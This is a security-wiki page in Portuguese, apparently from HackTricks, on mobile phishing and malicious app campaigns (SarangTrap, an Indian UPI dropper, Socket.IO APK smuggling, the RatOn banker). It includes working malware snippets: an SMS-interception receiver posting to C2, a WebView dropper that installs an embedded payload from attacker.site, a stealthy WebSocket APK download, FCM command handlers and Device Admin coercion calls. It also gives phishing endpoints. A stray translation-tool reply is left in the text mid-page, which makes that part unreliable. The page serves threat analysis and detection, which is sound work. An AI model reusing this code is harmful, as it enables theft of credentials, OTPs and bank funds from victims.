# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cobre técnicas usadas por atores de ameaça para distribuir **malicious Android APKs** e **iOS mobile-configuration profiles** através de phishing (SEO, social engineering, fake stores, dating apps, etc.).
> O material é adaptado da campanha SarangTrap exposta pelo Zimperium zLabs (2025) e por outras pesquisas públicas.

## Fluxo de Ataque

1. **SEO/Phishing Infrastructure**
* Registrar dezenas de domínios semelhantes (sites de encontros, compartilhamento na nuvem, serviços de automóvel…).
– Use palavras-chave no idioma local e emojis no elemento `<title>` para ranquear no Google.
– Hospede *both* instruções de instalação para Android (`.apk`) e iOS na mesma landing page.
2. **First Stage Download**
* Android: link direto para um APK *unsigned* ou de “third-party store”.
* iOS: `itms-services://` ou link HTTPS simples para um perfil malicioso **mobileconfig** (ver abaixo).
3. **Post-install Social Engineering**
* Na primeira execução o app solicita um **invitation / verification code** (ilusão de acesso exclusivo).
* O código é **POSTed over HTTP** para o Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ o malware continua.
* Análises dinâmicas de Sandbox / AV que nunca enviam um código válido não observam **comportamento malicioso** (evasão).
4. **Runtime Permission Abuse** (Android)
* Permissões perigosas são solicitadas apenas **após resposta positiva do C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Versões recentes **removem `<uses-permission>` para SMS de `AndroidManifest.xml`** mas deixam o caminho de código Java/Kotlin que lê SMS por reflexão ⇒ reduz a pontuação estática enquanto continua funcional em dispositivos que concedem a permissão via `AppOps` abuse ou alvos antigos.
5. **Facade UI & Background Collection**
* O app mostra views inofensivas (SMS viewer, gallery picker) implementadas localmente.
* Enquanto isso, exfiltra:
- IMEI / IMSI, número de telefone
- dump completo do `ContactsContract` (JSON array)
- JPEG/PNG de `/sdcard/DCIM` comprimidos com [Luban](https://github.com/Curzibn/Luban) para reduzir o tamanho
- Conteúdo opcional de SMS (`content://sms`)
Payloads são **batch-zipped** e enviados via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Um único **mobile-configuration profile** pode requerer `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em supervisão similar a “MDM”.
* Social-engineering instructions:
1. Abra Settings ➜ *Profile downloaded*.
2. Toque em *Install* três vezes (capturas de tela na página de phishing).
3. Confie no perfil unsigned ➜ o atacante ganha *Contacts* & *Photo* entitlement sem revisão da App Store.
7. **Network Layer**
* HTTP simples, frequentemente na porta 80 com HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de detectar).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Durante a avaliação de malware, automatize a fase do código de convite com Frida/Objection para alcançar o ramo malicioso.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` com o runtime `PackageManager#getRequestedPermissions()`; a ausência de permissões perigosas é um sinal de alerta.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar padrões irregulares de POST após a inserção do código.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` no macOS para listar `PayloadContent` e identificar entitlements excessivos.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** para detectar surgimento repentino de domínios ricos em palavras-chave.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
* **Invite-code Telemetry** – POST de códigos numéricos de 6–8 dígitos logo após a instalação do APK pode indicar staging.
* **MobileConfig Signing** – Bloquear perfis de configuração unsigned via política MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Esse padrão foi observado em campanhas que abusam de temas de benefícios governamentais para roubar credenciais UPI indianas e OTPs. Operadores encadeiam plataformas reputadas para entrega e resiliência.

### Delivery chain across trusted platforms
- YouTube video lure → a descrição contém um link curto
- Shortlink → site de phishing no GitHub Pages imitando o portal legítimo
- O mesmo repositório GitHub hospeda um APK com um selo falso “Google Play” linkando diretamente para o arquivo
- Páginas de phishing dinâmicas hospedadas no Replit; o canal remoto de comandos usa Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- O primeiro APK é um instalador (dropper) que inclui o malware real em `assets/app.apk` e solicita ao usuário que desative Wi‑Fi/dados móveis para reduzir a detecção na nuvem.
- O payload embutido instala-se sob um rótulo inocente (por exemplo, “Secure Update”). Após a instalação, tanto o instalador quanto o payload aparecem como apps separados.

Dica de triagem estática (grep por payloads embutidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware busca uma lista em texto simples, separada por vírgulas, de endpoints ativos a partir de um shortlink; transformações simples de string produzem o caminho final da página de phishing.
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-código:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- A etapa “Make payment of ₹1 / UPI‑Lite” carrega um formulário HTML do atacante do endpoint dinâmico dentro de um WebView e captura campos sensíveis (telefone, banco, UPI PIN) que são `POST`ados para `addup.php`.

Loader mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagação e interceptação de SMS/OTP
- Permissões agressivas são solicitadas na primeira execução:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Os contatos são percorridos para envio em massa de smishing SMS a partir do dispositivo da vítima.
- SMS recebidos são interceptados por um broadcast receiver e enviados com metadados (remetente, corpo, slot do SIM, ID aleatório por dispositivo) para `/addsm.php`.

Esboço do receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- O payload registra-se no FCM; as push messages contêm um campo `_type` usado como um switch para acionar ações (e.g., atualizar modelos de texto de phishing, alternar comportamentos).

Exemplo de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esboço do handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Padrões de hunting e IOCs
- APK contém payload secundário em `assets/app.apk`
- WebView carrega pagamento de `gate.htm` e exfiltra para `/addup.php`
- Exfiltração de SMS para `/addsm.php`
- Busca de config acionada por shortlink (e.g., `rebrand.ly/*`) retornando endpoints CSV
- Apps rotulados como genéricos “Update/Secure Update”
- Mensagens FCM `data` com um discriminador `_type` em apps não confiáveis

### Ideias de detecção e defesa
- Sinalizar apps que instruem usuários a desativar a rede durante a instalação e então fazem sideload de um segundo APK de `assets/`.
- Alertar sobre a tupla de permissões: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + fluxos de pagamento baseados em WebView.
- Monitoramento de egress para `POST /addup.php|/addsm.php` em hosts não-corporativos; bloquear infraestrutura conhecida.
- Regras Mobile EDR: app não confiável registrando-se no FCM e ramificando com base no campo `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Ataquantes cada vez mais substituem links estáticos de APK por um canal Socket.IO/WebSocket embutido em iscas com aparência do Google Play. Isso oculta a URL do payload, contorna filtros de URL/extensão e preserva uma experiência de instalação realista (install UX).

Fluxo típico do cliente observado no mundo real:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Por que isso evita controles simples:
- No static APK URL is exposed; o payload é reconstruído na memória a partir de frames de WebSocket.
- URL/MIME/extension filters que bloqueiam respostas .apk diretas podem falhar ao identificar dados binários tunelados via WebSockets/Socket.IO.
- Crawlers e URL sandboxes que não executam WebSockets não recuperarão o payload.

Ideias para hunting e detecção:
- Web/network telemetry: sinalize sessões WebSocket que transferem grandes blocos binários seguidos da criação de um Blob com MIME application/vnd.android.package-archive e um clique programático em `<a download>`. Procure por client strings como socket.emit('startDownload'), e por eventos chamados chunk, downloadProgress, downloadComplete em scripts de página.
- Play-store spoof heuristics: em domínios não-Google que servem páginas semelhantes ao Play, procure por Google Play UI strings como http.html:"VfPpkd-jY41G-V67aGc", templates mistos por idioma, e fluxos falsos de “verification/progress” dirigidos por eventos WS.
- Controles: bloqueie entrega de APKs de origens não-Google; imponha políticas de MIME/extensão que incluam tráfego WebSocket; preserve os prompts de download seguro do navegador.

Veja também WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Estudo de caso RatOn

A campanha RatOn banker/RAT (ThreatFabric) é um exemplo concreto de como operações modernas de phishing móvel misturam WebView droppers, automação de UI guiada por Accessibility, overlays/ransom, coerção via Device Admin, Automated Transfer System (ATS), takeover de crypto wallets, e até orquestração de relay NFC. Esta seção abstrai as técnicas reutilizáveis.

### Stage-1: WebView → native install bridge (dropper)
Os atacantes apresentam um WebView apontando para uma página maliciosa e injetam uma interface JavaScript que expõe um instalador nativo. Um toque em um botão HTML chama código nativo que instala um APK de segunda etapa empacotado nos assets do dropper e depois o inicia diretamente.

Padrão mínimo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Você não incluiu o HTML. Por favor, cole o conteúdo HTML ou o texto do arquivo src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md que deseja traduzir para português. Vou preservar exatamente as tags Markdown/HTML, links e paths conforme solicitado.
```html
<button onclick="bridge.installApk()">Install</button>
```
Após a instalação, o dropper inicia o payload via package/activity explícita:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideia de hunting: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Funil de consentimento: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 abre um WebView que hospeda uma página “Access”. O botão desta invoca um método exportado que navega a vítima para as configurações de Accessibility e solicita a ativação do serviço malicioso. Uma vez concedido, o malware usa Accessibility para clicar automaticamente através dos diálogos de permissão de runtime subsequentes (contacts, overlay, manage system settings, etc.) e solicita Device Admin.

- Accessibility ajuda programaticamente a aceitar prompts posteriores encontrando botões como “Allow”/“OK” na árvore de nós e disparando cliques.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Veja também:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operadores podem emitir comandos para:
- renderizar um overlay em tela cheia a partir de uma URL, ou
- passar HTML inline que é carregado em um overlay WebView.

Prováveis usos: coercion (entrada de PIN), abertura de wallet para capturar PINs, mensagens de ransom. Mantenha um comando para garantir que a permissão de overlay seja concedida se estiver ausente.

### Remote control model – text pseudo-screen + screen-cast
- Baixa largura de banda: despejar periodicamente a árvore de nós do Accessibility, serializar textos visíveis/roles/bounds e enviar para o C2 como uma pseudo-tela (comandos como `txt_screen` para uma vez e `screen_live` para contínuo).
- Alta fidelidade: solicitar MediaProjection e iniciar screen-casting/gravação sob demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dada uma tarefa JSON, abrir o app bancário, controlar a UI via Accessibility com uma mistura de consultas por texto e toques por coordenadas, e inserir o PIN de pagamento da vítima quando solicitado.

Exemplo de tarefa:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemplos de textos vistos em um fluxo alvo (CZ → EN):
- "Nová platba" → "Novo pagamento"
- "Zadat platbu" → "Inserir pagamento"
- "Nový příjemce" → "Novo beneficiário"
- "Domácí číslo účtu" → "Número de conta doméstica"
- "Další" → "Próximo"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sim, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Concluído"

Os operadores também podem verificar/aumentar os limites de transferência via comandos como `check_limit` e `limit` que navegam na UI de limites de forma semelhante.

### Crypto wallet seed extraction
Alvos como MetaMask, Trust Wallet, Blockchain.com, Phantom. Fluxo: desbloquear (PIN roubado ou senha fornecida), navegar até Security/Recovery, revelar/mostrar seed phrase, keylog/exfiltrate it. Implemente seletores sensíveis ao locale (EN/RU/CZ/SK) para estabilizar a navegação entre idiomas.

### Device Admin coercion
Device Admin APIs são usadas para aumentar as oportunidades de PIN-capture e frustrar a vítima:

- Bloqueio imediato:
```java
dpm.lockNow();
```
- Expirar a credencial atual para forçar a alteração (Accessibility captura o novo PIN/senha):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forçar desbloqueio não biométrico desativando recursos biométricos do keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muitos controles do DevicePolicyManager requerem Device Owner/Profile Owner em versões recentes do Android; algumas builds OEM podem ser mais permissivas. Sempre valide no OS/OEM alvo.

### Orquestração de NFC relay (NFSkate)
Stage-3 pode instalar e lançar um módulo externo de NFC-relay (p.ex., NFSkate) e até fornecer um template HTML para guiar a vítima durante o relay. Isso permite cash-out sem contato com cartão presente juntamente com ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Conjunto de comandos do operador (exemplo)
- UI/estado: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Sobreposições: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Carteiras: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ideias de detecção e defesa (estilo RatOn)
- Caçar WebViews com `addJavascriptInterface()` que exponham métodos de installer/permission; páginas que terminam em “/access” que disparam prompts de Accessibility.
- Alertar sobre apps que geram gestos/cliques de Accessibility em alta taxa logo após receberem acesso ao serviço; telemetria que se assemelha a dumps de nodes de Accessibility enviados para C2.
- Monitorar mudanças na Device Admin policy em apps não confiáveis: `lockNow`, expiração de senha, alternâncias de funcionalidades do keyguard.
- Alertar sobre prompts de MediaProjection de apps não-corporativos seguidos de uploads periódicos de frames.
- Detectar instalação/lançamento de um app NFC-relay externo disparado por outro app.
- Para bancos: impor confirmações out-of-band, biometrics-binding, e limites de transação resistentes a automação on-device.

## Referências

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
